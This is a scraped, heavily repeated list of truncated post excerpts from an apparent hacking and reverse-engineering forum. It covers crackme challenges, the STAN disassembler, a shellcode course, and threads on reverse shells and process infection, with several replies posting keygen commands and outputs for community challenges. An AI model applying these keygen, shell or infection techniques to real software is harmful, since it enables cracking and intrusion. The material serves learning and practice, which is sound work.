things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "@0x00pf thanks! I had the line from where I took the binary from in my draft, but somehow I messed up and didn\u2019t include it here. Added it to the top", "@0x00pf thanks! I had the line from where I took the binary from in my draft, but somehow I messed up and didn\u2019t include it here. Added it to the top", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "Nice post @ricksanchez\u2026 would you mind to post a link to the binary, so people can try what you have just described?", "PrefaceThis write up are my thoughts and steps to analyze a given unknown binary. I want to understand the binary to a point where I can freely write about it. So here it is. I\u2019m always open for you pointing out mistakes or giving feedback to me Disclaimer:I won\u2019t look at the assembly code to p&hellip;", "Hello folks! I hope you\u2019re all doing great! Since there\u2019s a plethora of reversing/crackme challenges on 0x00sec, it\u2019s time to step up the game with some binary exploitation one since that happens to be my favorite field as well. ###Difficulty Average ###Objective Get a shell. ###Rules ASLR&hellip;", "Thanks @SmartOne  I will fix the typo in the next commit", "Meant to be \u201cDumping Core\u201d?", "Meant to be \u201cDumping Core\u201d?", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "@_py Thanks mate\u2026 no worries I know you are busy and as @ricksanchez it is all about promotion \u2026 I have been looking at Unicorn Engine\u2026  @ricksanchez thanks mate. Glad to hear you liked it", "@_py Thanks mate\u2026 no worries I know you are busy and as @ricksanchez it is all about promotion \u2026 I have been looking at Unicorn Engine\u2026  @ricksanchez thanks mate. Glad to hear you liked it", "@_py Thanks mate\u2026 no worries I know you are busy and as @ricksanchez it is all about promotion \u2026 I have been looking at Unicorn Engine\u2026  @ricksanchez thanks mate. Glad to hear you liked it", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "@_py Thanks mate\u2026 no worries I know you are busy and as @ricksanchez it is all about promotion \u2026 I have been looking at Unicorn Engine\u2026  @ricksanchez thanks mate. Glad to hear you liked it", "@_py Thanks mate\u2026 no worries I know you are busy and as @ricksanchez it is all about promotion \u2026 I have been looking at Unicorn Engine\u2026  @ricksanchez thanks mate. Glad to hear you liked it", "Great write up for your own challenge, promoting your own tool again. Smart move  . Seriously though, really solid article which is easy to follow. Helped me and most likely will help all the new people who want to dive into RE as well", "You need to stop being so good man! If you manage to add some sort of symbolic execution features in STAN, it\u2019d be pure orgasm. By the way, my apologies for not posting my write up for your challenge but I got caught up with exams.", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "It has been a while since I wrote the Late Easter  challenge and now that STAN is around, this is a good excuse to present some of the latest functions I have add to my little tool  So, in this write-up I\u2019m going to solve the stripped version of the challenge. Grab the binary, grab STAN (https://gi&hellip;", "Cheers for that! ch4p here from Hack The Box. Let me just state, that you are free to post solutions and walkthroughs on Retired machines. We will retire one every time a new one is released to keep always 20 machines that will count for points. The retired ones will be available but not give poin&hellip;", "Hi fellas, Following my last article, RE for beginners: Methodology and tools, I decided to do this write up in order to present you another common issue that people, exercising in this area, should be quickly confronted to, anti-debugger technologies. For the sake of this article, I picked a chal&hellip;", "Hi fellas, Following my last article, RE for beginners: Methodology and tools, I decided to do this write up in order to present you another common issue that people, exercising in this area, should be quickly confronted to, anti-debugger technologies. For the sake of this article, I picked a chal&hellip;", "Steganography involves cryptography, otherwise, your hidden data will decrease the entropy which, compared to the standard, will lead to its detection. This method is known as DCT steganography. Here is a paper about this process. Disclaimer: I didn\u2019t read it, but it will certainly explain DCT al&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Please don\u2019t post solutions / walkthroughs. I STRONGLY recommend everyone to read this: https://www.hackthebox.eu/en/home/rules Especially Rule 7. I think it\u2019s not fair to participate in such an awesome learning experience, that is - on top of that - offered for FREE and then shit all over their &hellip;", "Congrats mate!", "Hello folks! I hope you\u2019re doing great! This is my first time I ever create a reversing engineering challenge so I\u2019m hoping there won\u2019t be any issue such as unintended solutions/bugs. ###Difficulty A big part of Reverse Engineering has to do with observation. That being said, depending on how sha&hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Oh if that\u2019s the case things obviously change\u2026 and I thought you\u2019re a genius man, but just 978 LoC that\u2019s not even 1k. mpfff weak stuff man  . Ah common @0x00pf it doesnt matter if it\u2019s 1k or 1.2k LoC\u2026 It\u2019s an alpha release and it\u2019s already a tool which makes the life of every beginner RE or someo&hellip;", "Oh if that\u2019s the case things obviously change\u2026 and I thought you\u2019re a genius man, but just 978 LoC that\u2019s not even 1k. mpfff weak stuff man  . Ah common @0x00pf it doesnt matter if it\u2019s 1k or 1.2k LoC\u2026 It\u2019s an alpha release and it\u2019s already a tool which makes the life of every beginner RE or someo&hellip;", "just joking man  . Also you\u2019re telling your story of \u201cjust 1.2kLoC in a couple of days\u201d like it is nothing. I\u2019d need way longer ofr that. So I\u2019m massively impressed  Also looking forward to the next challenge", "OK\u2026 my bad I just checked the lines in the source file not the actual LoCs. Just run sloccount on my first PoC and it  reported 978 LoC, so roughly just 1KLoc. Sorry about the confusion.", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "@ricksanchez\u2026 it will not be that easy. Actually the challenge I\u2019m working on completely defeats STAN\u2026 but I\u2019ll do some improvements to the tool before releasing the challenge (still waiting for some feedback on the challenge tho) @pry0cc I look forward  to any feedback. What\u2019s next?.. well I have &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "just joking man  . Also you\u2019re telling your story of \u201cjust 1.2kLoC in a couple of days\u201d like it is nothing. I\u2019d need way longer ofr that. So I\u2019m massively impressed  Also looking forward to the next challenge", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "@ricksanchez\u2026 it will not be that easy. Actually the challenge I\u2019m working on completely defeats STAN\u2026 but I\u2019ll do some improvements to the tool before releasing the challenge (still waiting for some feedback on the challenge tho) @pry0cc I look forward  to any feedback. What\u2019s next?.. well I have &hellip;", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "Thanks @SmartOne That capstone framework is amazing. I\u2019ve got a working PoC (around 1.2KLoC) in a couple of days. Then it took me 2/3 days to just refactor that code in something with a bit of structure. So, roughly it took two complete weekends plus some hours every day during the week. Regarding&hellip;", "This is crazy  Phenomenous work! And you did it all on your own? How long did it actually take you to code it/get the idea? Best, SmartOne", "@ricksanchez\u2026 it will not be that easy. Actually the challenge I\u2019m working on completely defeats STAN\u2026 but I\u2019ll do some improvements to the tool before releasing the challenge (still waiting for some feedback on the challenge tho) @pry0cc I look forward  to any feedback. What\u2019s next?.. well I have &hellip;", "My internal mental monologue: &quot;Hmm I wonder where Pico is. He seems kind of quiet lately\u2019 \u201cWho\u2019s Stan?\u201d \u201cOH DAMN HE\u2019S ONLY DONE IT AGAIN\u201d This is super cool. I am so happy you have made something just for beginners. Most of the commands are readable, and thus easier to remember. As somebody who&hellip;", "You mad man @0x00pf . Nice post as always. Soon you will post challenges and then we can just run STAN and it will spit out the solutions", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "You mad man @0x00pf . Nice post as always. Soon you will post challenges and then we can just run STAN and it will spit out the solutions", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "I believe many of us have read that book. It is a great book! https://0x00sec.org/t/hacking-related-books/849", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "@ricksanchez very nice write-up! And congrats for the solution. I would expect people to reverse the final password (it was a reverse engineering challenge after all) but brute forcing it is also fine.  I will have to go hard core for the next one !!", "@ricksanchez very nice write-up! And congrats for the solution. I would expect people to reverse the final password (it was a reverse engineering challenge after all) but brute forcing it is also fine.  I will have to go hard core for the next one !!", "Oh I was pretty close \u2026 It looks ovbious when you read the write up ahah Thanks @ricksanchez  for yourwrite up ! And thanks @0x00pf for the challenge !", "Oh I was pretty close \u2026 It looks ovbious when you read the write up ahah Thanks @ricksanchez  for yourwrite up ! And thanks @0x00pf for the challenge !", "@twyK Thanks  @0x00pf Thank you as well. I intended to do that, but I\u2019m not feeling confident enough with asm and tools like bninja yet, so I had to take the easy way out. Oh please lord\u2026 Have mercy with us poor souls\u2026  I will try to read a lot into that stuff and will participate again when i&hellip;", "@twyK Thanks  @0x00pf Thank you as well. I intended to do that, but I\u2019m not feeling confident enough with asm and tools like bninja yet, so I had to take the easy way out. Oh please lord\u2026 Have mercy with us poor souls\u2026  I will try to read a lot into that stuff and will participate again when i&hellip;", "One of the best article on buffering (buffer cache) / optimization I ever have read. How is GNU yes so fast?", "@ricksanchez very nice write-up! And congrats for the solution. I would expect people to reverse the final password (it was a reverse engineering challenge after all) but brute forcing it is also fine.  I will have to go hard core for the next one !!", "PrefaceThis is a write-up for solving the devil-swapper RE challenge by @0x00pf . It was mostly intended for my personal archive but since it may be interesting to all of you I will try to format it in a clear and most importantly scrub friendly way for people like myself\u2026 Since I got stuck along&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "PrefaceThis is a write-up for solving the devil-swapper RE challenge by @0x00pf . It was mostly intended for my personal archive but since it may be interesting to all of you I will try to format it in a clear and most importantly scrub friendly way for people like myself\u2026 Since I got stuck along&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "Oh man, good timing! Thanks", "I\u2019m waiting for the solution too \u2026 I don\u2019t find anything else than the rot13 string , I tried to use some dd conv but I don\u2019t find the solution", "@0x00pf can you give ma a hint for the last step? I just seem to not get it. [spoiler] Found the cipher, identified the encryption, decrypted it, read the man page and now I\u2019m confused Edit: vote for smileys within spoiler tags [/spoiler]", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Congrats mate!", "Congrats mate!", "Thank you @0x00pf for the challenge ( and @kowalski for trying to help me with some command-line-fu) ! I will not post the full solution yet since it looks like some folks are close. [asciicast]", "Thank you @0x00pf for the challenge ( and @kowalski for trying to help me with some command-line-fu) ! I will not post the full solution yet since it looks like some folks are close. [asciicast]", "Kek, I was just explaining to some of the members your Easter challenge, I hope not many noticed it on IRC.", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "OK guys\u2026 you almost have the solution.  Thanks to all of you for trying this challenge! So this is another hint By now you know which tool you have to use and you should have found a bunch of transformations to use. The title of the challenge gives you a hint on which transformation to apply. The&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "@0x00pf can you give ma a hint for the last step? I just seem to not get it. [spoiler] Found the cipher, identified the encryption, decrypted it, read the man page and now I\u2019m confused Edit: vote for smileys within spoiler tags [/spoiler]", "You are getting closer! Yes, it is. Now you should know which tool you can use and which part of its man page to check\u2026", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Found the ROT13 text, is the same thing of the hint on the binary? Btw i\u2019m too noob can\u2019t proceed, need to learn some tools &gt;:", "You are getting closer! Yes, it is. Now you should know which tool you can use and which part of its man page to check\u2026", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "@ricksanchez: I\u2019ll express my opinion from a Linux user\u2019s perspective. Binary Ninja is totally worth it for Static Analysis. It helped me step up my RE game way too much/fast. Imo it\u2019s one of the best tools you can start with if you are serious about RE since it\u2019s not even that pricey (atm). 90 buc&hellip;", "@Nitrax Great introduction to that huge chapter of reversing. On a side note you mentioned PEDA. Maybe you wanna check out GEF. As a reference from ther wiki: ###But why not PEDA? Yes! Why not?! PEDA is a fantastic tool to do the same, but only works for x86-32 or x86-64x whereas GEF supports&hellip;", "Hi fellas, A few days ago, I decided to start my adventure in the reverse engineering domain. I was quickly overwhelmed by a bunch of information and op codes that confused me a lot, even with solid knowledge in assembly and programming. Reverse engineering can seem complex at the first glance, ho&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Your weekend challenge is here! This is a simple challenge. Do not look for very sophisticated stuff. You know\u2026 the devil\u2019s in the details. Boring to deathEasyInterestingWTF0voters Show results#Objective You have to find the secret key and the secret message. That\u2019s it Extra&hellip;", "Cool\u2026 I used the papers from Scientific America from the 80s.  May still be a good reading  http://www.koth.org/info/akdewdney/", "Stop being so negative and practical  Hacking and making something work isn\u2019t about cost effectiveness. It\u2019s because making your own stuff is cool! I don\u2019t think you can talk for all hardware guys, after all, there are a lot of them. In time too, things do come down in price. This project is a mix&hellip;", "That\u2019s 100% not a mindset of a hardware hacker or any hacker for that matter.", "Just reorganised my e-book and other PDF resources and uploaded them onto my GitLab. Entry-level stuff here, mostly RE or malware or AV detection evasion content since I don\u2019t dabble much in the other areas so if any of you are interested in that stuff, go nuts. I might update the READMEs in a futur&hellip;", "Cool\u2026 I used the papers from Scientific America from the 80s.  May still be a good reading  http://www.koth.org/info/akdewdney/", "Grab an Arietta G25 and attach a USB-ETH adapter to the header (you may need to open it up and do some soldering) or hook up a ENC28J60 module to the SPI bus if 10Mbps is fine with you. You just need to solder 4/5 cables in any cases\u2026 then it is just a matter of what SW do you want to install. You &hellip;", "Grab an Arietta G25 and attach a USB-ETH adapter to the header (you may need to open it up and do some soldering) or hook up a ENC28J60 module to the SPI bus if 10Mbps is fine with you. You just need to solder 4/5 cables in any cases\u2026 then it is just a matter of what SW do you want to install. You &hellip;", "Grab an Arietta G25 and attach a USB-ETH adapter to the header (you may need to open it up and do some soldering) or hook up a ENC28J60 module to the SPI bus if 10Mbps is fine with you. You just need to solder 4/5 cables in any cases\u2026 then it is just a matter of what SW do you want to install. You &hellip;", "Cool\u2026 I used the papers from Scientific America from the 80s.  May still be a good reading  http://www.koth.org/info/akdewdney/", "I didn\u2019t find my code base yet, however here is the subject if someone want to develop it", "I didn\u2019t find my code base yet, however here is the subject if someone want to develop it", "Cool solution\u2026 Try your skills on my last challenge if this one\u2019s too easy for you .", "I had read the ARM assembly basics but not this article. It is very useful. Actually I wanted to use something different than Raspbian and use other ARM machines (RAM is limited to 256 Mb with versatilepb) but hey, it is working  Some of you may wonder why I complain about the versatilepb memory li&hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Thanks for the challenge; here is my solution : $ ./keygen.py neolex | xxd -p 0856cc12 $ ./keygen.py pseudo | xxd -p 6cded014 $ ./keygen.py overflow | xxd -p 945a9954  [spoiler][code]#!/usr/bin/env python2 import struct import sys pseudo = str(sys.argv[1]) key= 0 for letter in pseudo: &hellip;", "Wow, great job, very elegant!  Bonus points to you for a single byte patch!", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "Wow, great job, very elegant!  Bonus points to you for a single byte patch!", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "My three keys ;)\u2026 $ ./k dtm | xxd -p d4b80102 $ ./k pico | xxd -p a48a9204 $ ./k 0x00sec | xxd -p 844cad11 Thanks for taking the time to write this challenge!!! For the LuLz\u2026 this is my keygen code, after some obfuscation . It works in my box, but that is not the right way to write code  #&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "Suh doods, got another challenge which will probably be my last one for a while due to my lack of knowledge of the Linux system. I may make some Windows challenges if anyone wishes. If anyone would like the source code to this, please tell me! DifficultyDepends on your current knowledge. Persona&hellip;", "I believe many of us have read that book. It is a great book! https://0x00sec.org/t/hacking-related-books/849", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "I believe many of us have read that book. It is a great book! https://0x00sec.org/t/hacking-related-books/849", "Has anyone read Learning Linux Binary Analysis? It covers a lot of what is covered here. In addition, it gives an excellent overview of the ELF format and goes over how to write Linux malware", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Hi @FormosaTBM and welcomed! Right. You may also consider MIPS as that is the most extended platforms for network devices. Once you manage one of the platforms, moving to a new one is easy because, the basics (as @_py said), are the same. /self promo mode=&quot;on&quot; Take a look to the programming for &hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Thanks @captainlettuce. To be honest I wrote part IV long ago, but I was not happy with the result. It was very theoretical and I didn\u2019t manage to get some practical examples in. I\u2019d try to continue it but it may take a while until I get the time and also a nice idea to continue the course followin&hellip;", "Saw now that this post is quite old, will you continue doing this? Really appreciated it so far!", "Come get ya keys python keygen.py Wunkolo | xxd -p 0c8ae91f python keygen.py 0x00sec.org | xxd -p 4cc0491d python keygen.py dtm | xxd -p d4b80102 python keygen.py Customer | xxd -p b8efdc37 My \u201cKeygen\u201d using python import structimport sysdef keygen(Name):        Key = 0        for char in&hellip;", "Thanks for sharing this @Pwned08000202  \u2026 very good! I\u2019ve to update my code!", "I try to set permission in my LKM with this little piece of code and it works perfectly : // set permission for all users in read and write (stop cmd chmod 0666 in dev device) static int uevent(struct device *dev, struct kobj_uevent_env *env){ add_uevent_var(env, \u201cDEVMODE=%#o\u201d, 0666); return 0; &hellip;", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "You\u2019re too good, dude! You stole my serial key too!  I\u2019ll make the next one a bit more challenging. P.S. This isn\u2019t how you use Perl!", "You\u2019re too good, dude! You stole my serial key too!  I\u2019ll make the next one a bit more challenging. P.S. This isn\u2019t how you use Perl!", "My three keys ;)\u2026 $ ./k dtm | xxd -p d4b80102 $ ./k pico | xxd -p a48a9204 $ ./k 0x00sec | xxd -p 844cad11 Thanks for taking the time to write this challenge!!! For the LuLz\u2026 this is my keygen code, after some obfuscation . It works in my box, but that is not the right way to write code  #&hellip;", "My three keys ;)\u2026 $ ./k dtm | xxd -p d4b80102 $ ./k pico | xxd -p a48a9204 $ ./k 0x00sec | xxd -p 844cad11 Thanks for taking the time to write this challenge!!! For the LuLz\u2026 this is my keygen code, after some obfuscation . It works in my box, but that is not the right way to write code  #&hellip;", "Suh dudes, been a while since I posted a challenge, so here we go! DifficultyThe difficulty depends on how well you can think and apply your knowledge. EZPZNot badChallengingDark SoulsM/o/Vfuscator0voters Show resultsGoalThe aim of this task is to create your own keygen, i.&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Necrobumping can be bad. But in this case I think it\u2019s fully acceptable. This article is super relevant, and interesting, and I can\u2019t believe I missed it.", "You found a way. That is so good. This kind of attack would be really cool with a rubber ducky.", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the 